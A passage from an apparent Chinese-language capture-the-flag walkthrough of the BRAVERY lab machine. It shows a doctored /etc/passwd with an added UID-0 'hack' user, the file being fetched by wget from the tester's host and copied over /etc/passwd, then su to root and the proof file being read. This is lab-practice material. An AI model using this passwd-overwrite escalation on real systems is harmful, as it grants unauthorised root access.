rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin
colord:x:992:988:User for colord:/var/lib/colord:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
saslauth:x:991:76:Saslauthd user:/run/saslauthd:/sbin/nologin
pulse:x:171:171:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin
sssd:x:990:984:User for sssd:/:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
radvd:x:75:75:radvd user:/:/sbin/nologin
gdm:x:42:42::/var/lib/gdm:/sbin/nologin
setroubleshoot:x:989:983::/var/lib/setroubleshoot:/sbin/nologin
gnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
ossec:x:1001:1002::/var/ossec:/sbin/nologin
ossecm:x:1002:1002::/var/ossec:/sbin/nologin
ossecr:x:1003:1002::/var/ossec:/sbin/nologin
rick:x:1004:1004::/home/rick:/bin/bash
hack:$1$hack$xR6zsfvpez/t8teGRRSNr.:0:0:root:/bin/bash
```

传到`/tmp`后替换掉原有的`/etc/passwd`即可：

```text
sh-4.2$ cd /tmp
cd /tmp
sh-4.2$ wget http://10.160.78.86:8888/passwd
wget http://10.160.78.86:8888/passwd
--2024-03-22 15:04:27--  http://10.160.78.86:8888/passwd
Connecting to 10.160.78.86:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2641 (2.6K) [application/octet-stream]
Saving to: 'passwd'

     0K ..                                                    100%  570M=0s

2024-03-22 15:04:27 (570 MB/s) - 'passwd' saved [2641/2641]

sh-4.2$ cp passwd /etc/passwd
cp passwd /etc/passwd
sh-4.2$ su hack
su hack
Password: hack
whoami
root
id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:httpd_t:s0
cd /root
ls -la
total 72
dr-xr-x---. 17 root root 4096 Dec 26  2018 .
dr-xr-xr-x. 18 root root  254 Sep 28  2018 ..
-rw-------.  1 root root 5282 Dec 25  2018 .ICEauthority
-rw-------.  1 root root    0 Jun 23  2018 .Xauthority
-rw-------.  1 root root 2191 Dec 26  2018 .bash_history
-rw-r--r--.  1 root root   18 Dec 28  2013 .bash_logout
-rw-r--r--.  1 root root  176 Dec 28  2013 .bash_profile
-rw-r--r--.  1 root root  176 Dec 28  2013 .bashrc
drwx------. 17 root root 4096 Jul  4  2018 .cache
drwxr-xr-x. 17 root root 4096 Jul  6  2018 .config
-rw-r--r--.  1 root root  100 Dec 28  2013 .cshrc
drwx------.  3 root root   25 Jun 13  2018 .dbus
-rw-------.  1 root root   16 Jun 13  2018 .esd_auth
drwx------.  3 root root   19 Jun 13  2018 .local
drwxr-xr-x.  4 root root   39 Jun 17  2018 .mozilla
-rw-------.  1 root root   77 Jul  6  2018 .mysql_history
drwxr-----.  3 root root   19 Jun 10  2018 .pki
-rw-------.  1 root root 1024 Jun 10  2018 .rnd
-rw-r--r--.  1 root root  129 Dec 28  2013 .tcshrc
-rw-------.  1 root root  584 Jul  4  2018 .viminfo
drwxr-xr-x.  2 root root    6 Jun 19  2018 Desktop
drwxr-xr-x.  2 root root    6 Jun 13  2018 Documents
drwxr-xr-x.  2 root root    6 Jun 13  2018 Downloads
drwxr-xr-x.  2 root root    6 Jun 13  2018 Music
drwxr-xr-x.  2 root root    6 Jun 13  2018 Pictures
drwxr-xr-x.  2 root root    6 Jun 13  2018 Public
drwxr-xr-x.  2 root root    6 Jun 13  2018 Templates
drwxr-xr-x.  2 root root    6 Jun 13  2018 Videos
-rw-------.  1 root root 1408 Jun 10  2018 anaconda-ks.cfg
----------.  1 root root  284 Dec 26  2018 author-secret.txt
drwxrwxrwx.  8 root root  236 Jun 23  2018 ossec-hids-2.8
----------.  1 root root   39 Dec 25  2018 proof.txt
cat proof.txt
Congratulations on rooting BRAVERY. :)
```

这样就拿到root了！

